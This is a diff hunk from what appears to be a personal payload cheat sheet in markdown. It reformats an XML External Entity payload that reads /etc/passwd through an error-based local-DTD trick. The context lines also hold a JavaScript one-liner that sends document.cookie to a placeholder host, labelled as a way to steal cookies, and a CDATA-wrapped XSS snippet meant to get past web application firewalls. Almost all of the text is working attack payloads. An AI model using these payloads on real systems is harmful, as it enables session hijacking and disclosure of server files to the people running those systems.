@@ -15,20 +15,21 @@
  - `var url="https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies
 
 ### XML External Entity
-```xml
-<?xml version="1.0" ?>
-<!DOCTYPE message [
-<!ENTITY % local_dtd SYSTEM "https://docs.oracle.com/cd/E13153_01/wlcp/wlss40/sip-app_1_0.dtd.txt">
-<!ENTITY % condition 'aaa)>
-<!ENTITY &#x25; file SYSTEM "/etc/passwd">
-<!ENTITY &#x25; eval "
-<!ENTITY &#x26;#x25; error SYSTEM &#x27;http://&#x25;file;:asd@localhost:22&#x27;>">
-&#x25;eval;
-&#x25;error;
-<!ELEMENT aa (bb'>
-%local_dtd;
-]>
+ - ```xml
+ <?xml version="1.0" ?>
+ <!DOCTYPE message [
+ <!ENTITY % local_dtd SYSTEM "https://docs.oracle.com/cd/E13153_01/wlcp/wlss40/sip-app_1_0.dtd.txt">
+ <!ENTITY % condition 'aaa)>
+ <!ENTITY &#x25; file SYSTEM "/etc/passwd">
+ <!ENTITY &#x25; eval "
+ <!ENTITY &#x26;#x25; error SYSTEM &#x27;http://&#x25;file;:asd@localhost:22&#x27;>">
+ &#x25;eval;
+ &#x25;error;
+ <!ELEMENT aa (bb'>
+ %local_dtd;
+ ]>
 ``` (Used when i had no space left for internal entities into payload/dtd) 
+
  -  `<![CDATA[ <script>prompt(2)</script> ]]>` (Sometimes WAFS block by keywords like DOCTYPE, ENTITY & ect, but you can inject into `<![CDATA[X]]>` )
 
 ### PWN scripts/tips
